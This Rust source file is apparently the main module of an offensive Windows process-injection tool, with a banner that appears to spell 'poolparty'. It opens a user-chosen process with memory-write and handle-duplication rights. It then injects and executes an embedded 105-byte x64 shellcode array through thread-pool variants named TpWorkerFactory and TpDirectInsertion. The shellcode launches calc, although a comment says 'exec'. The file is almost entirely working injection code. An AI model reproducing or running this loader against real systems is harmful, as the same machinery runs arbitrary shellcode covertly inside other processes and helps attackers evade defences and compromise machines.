pub mod utils;
pub mod variants;
pub mod winapi;

use ghostptr::{ProcessAccess, ProcessError, RemoteProcess};
use std::io::stdin;

use crate::variants::variant_from_id;

// win64 shellcode for WinExec("exec")
const SHELLCODE: [u8; 105] = [
    0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6a, 0x60, 0x5a, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x54,
    0x59, 0x48, 0x83, 0xec, 0x28, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76, 0x18, 0x48, 0x8b, 0x76,
    0x10, 0x48, 0xad, 0x48, 0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x3, 0x57, 0x3c, 0x8b, 0x5c, 0x17,
    0x28, 0x8b, 0x74, 0x1f, 0x20, 0x48, 0x1, 0xfe, 0x8b, 0x54, 0x1f, 0x24, 0xf, 0xb7, 0x2c, 0x17,
    0x8d, 0x52, 0x2, 0xad, 0x81, 0x3c, 0x7, 0x57, 0x69, 0x6e, 0x45, 0x75, 0xef, 0x8b, 0x74, 0x1f,
    0x1c, 0x48, 0x1, 0xfe, 0x8b, 0x34, 0xae, 0x48, 0x1, 0xf7, 0x99, 0xff, 0xd7, 0x48, 0x83, 0xc4,
    0x30, 0x5d, 0x5f, 0x5e, 0x5b, 0x5a, 0x59, 0x58, 0xc3,
];

const SIGNATURE: &str = r#"
                                 ░██                                      ░██               
                                 ░██                                      ░██               
░████████   ░███████   ░███████  ░██    ░████████   ░██████   ░██░████ ░████████ ░██    ░██ 
░██    ░██ ░██    ░██ ░██    ░██ ░██    ░██    ░██       ░██  ░███        ░██    ░██    ░██ 
░██    ░██ ░██    ░██ ░██    ░██ ░██    ░██    ░██  ░███████  ░██         ░██    ░██    ░██ 
░███   ░██ ░██    ░██ ░██    ░██ ░██    ░███   ░██ ░██   ░██  ░██         ░██    ░██   ░███ 
░██░█████   ░███████   ░███████  ░██    ░██░█████   ░█████░██ ░██          ░████  ░█████░██ 
░██                                     ░██                                             ░██ 
░██                                     ░██                                       ░███████  
                                                                                            
"#;

const VARIANTS: &str = r#"
enter a variant:
	1) TpWorkerFactory
	2) TpDirectInsertion
	... more coming soon
"#;

fn pause() {
    println!("Press Enter to continue...");

    let mut input = String::new();
    stdin().read_line(&mut input).expect("failed to read line");
}

fn main() {
    let input = stdin();

    print!("{}", SIGNATURE);

    // get process input
    println!("enter pid or process name (case sensitive)");
    let mut process_identifier = String::new();
    input
        .read_line(&mut process_identifier)
        .expect("failed to read line");

    // open process
    let process_result;
	let access = ProcessAccess::VM_OPERATION | ProcessAccess::VM_WRITE | ProcessAccess::QUERY_INFORMATION | ProcessAccess::DUP_HANDLE;

    if let Ok(pid) = process_identifier.parse::<u32>() {
        process_result = RemoteProcess::open(pid, access);
    } else {
        process_result = RemoteProcess::open_first_named(process_identifier.trim(), access);
    }

    // error handling
    let process = match process_result {
        Ok(process) => process,

        Err(ProcessError::ProcessNotFound(name)) => {
            println!("process not found: {}", name);
            pause();
            panic!();
        }

        Err(ProcessError::NtStatus(status)) => {
            println!("NTSTATUS: {:#X}", status);
            pause();
            panic!();
        }

        _ => unreachable!(),
    };

    // variants
    println!("{}", VARIANTS);

    let mut variant_id_string = String::new();
    input
        .read_line(&mut variant_id_string)
        .expect("failed to read line");

    let Ok(variant_id) = variant_id_string.trim().parse::<u8>() else {
        println!("failed to parse variant id");
        pause();
        panic!();
    };

    let Some(variant) = variant_from_id(variant_id) else {
        println!("invalid variant id provided");
        pause();
        panic!();
    };

    println!();

    match variant.run(&process, &SHELLCODE) {
        Ok(()) => println!("successfully executed shellcode"),
        Err(e) => println!("failed to execute shellcode: {}", e),
    };

    pause();
}
